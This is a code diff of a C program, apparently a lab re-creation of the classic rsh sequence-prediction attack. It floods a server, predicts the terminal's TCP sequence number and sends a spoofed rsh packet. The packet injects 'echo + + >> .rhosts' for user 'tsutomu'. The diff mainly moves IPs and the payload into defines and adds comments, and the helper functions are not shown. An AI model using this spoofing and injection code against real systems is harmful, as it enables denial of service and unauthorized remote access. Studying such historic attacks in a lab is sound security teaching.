@@ -8,64 +8,80 @@
 #include "packetsniffer.h"
 #include <pcap/pcap.h>
 
+#define KEVINIP "172.16.45.2"
+#define SERVERIP "172.16.45.3"
+#define XTERMINALIP "172.16.45.4"
+#define SRCPORT 514
+#define DSTPORT 514
+#define EXPLOIT "0\0tsutomu\0tsutomu\0echo + + >> .rhosts"
+#define EXPLOITLEN 38
+
 void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
 
 int main()
 {
 
-    //Defining variables
+    //variables for storing IP adresses
     u_long server;
     u_long xterminal;
     u_long kevin;
-    libnet_t *l;  //Libnet Context
+    //Libnet Context and buffer for storing error
+    libnet_t *l;  
     char errbuf[LIBNET_ERRBUF_SIZE];
+    
     l = libnet_init(LIBNET_RAW4, NULL, errbuf);
 
+    //Check on libnet initialization
     if ( l == NULL ) {
-    fprintf(stderr, "libnet initialization failed: %s\n", errbuf);
-    exit(EXIT_FAILURE);
+        fprintf(stderr, "Libnet initialization failed: %s\n", errbuf);
+        exit(EXIT_FAILURE);
     }
-
+    //seed the number generator
     libnet_seed_prand(l);
 
-    //Retrieving IP by conversion
-    if((server=libnet_name2addr4(l,"172.16.45.3", LIBNET_DONT_RESOLVE))==(u_long)-1)
+    //Retrieving IP by conversion and check 
+    if((server=libnet_name2addr4(l,SERVERIP, LIBNET_DONT_RESOLVE))==(u_long)-1)
     {
         fprintf(stderr, "Error in server ip conversion");
         exit(0);
     }    
-    if((xterminal=libnet_name2addr4(l,"172.16.45.4", LIBNET_DONT_RESOLVE))==(u_long)-1)
+    if((xterminal=libnet_name2addr4(l,XTERMINALIP, LIBNET_DONT_RESOLVE))==(u_long)-1)
     {
         fprintf(stderr, "Error in xterminal ip conversion");
         exit(0);
     }
-    if((kevin=libnet_name2addr4(l,"172.16.45.2", LIBNET_DONT_RESOLVE))==(u_long)-1)
+    if((kevin=libnet_name2addr4(l,KEVINIP, LIBNET_DONT_RESOLVE))==(u_long)-1)
     {
         fprintf(stderr, "Error in kevin ip conversion");
         exit(0);        
     };
 
 
-
     //Server flood
-    fflush(stdout);
     printf("\n Disabling server...");
     fflush(stdout);
     disableServer(l,kevin,server);
-    usleep(1000);
+
+    //Create the pscket sniffer
     pcap_t *des=packetSnifferInitialize();
+
+    //Retrieve the next sequence of xterminal
     uint32_t next=getNextSeq(l,kevin,xterminal,514,514,des);
+
     printf("\n Next: %u",next);
     fflush(stdout);
+    //Exploiting RSH
     printf("\n EXPLOITING");
-    sendExploit(next,"0\0tsutomu\0tsutomu\0echo + + >> .rhosts",38,xterminal,server, l );
+    sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l );
+
     usleep(1000);
 
+    //RESTORE THE SERVER
     printf("\n Enabling the server...");
     fflush(stdout);
     enableServer(l,kevin,server);
 
-    //restore server
+
     libnet_destroy(l);
     return 0;
 }
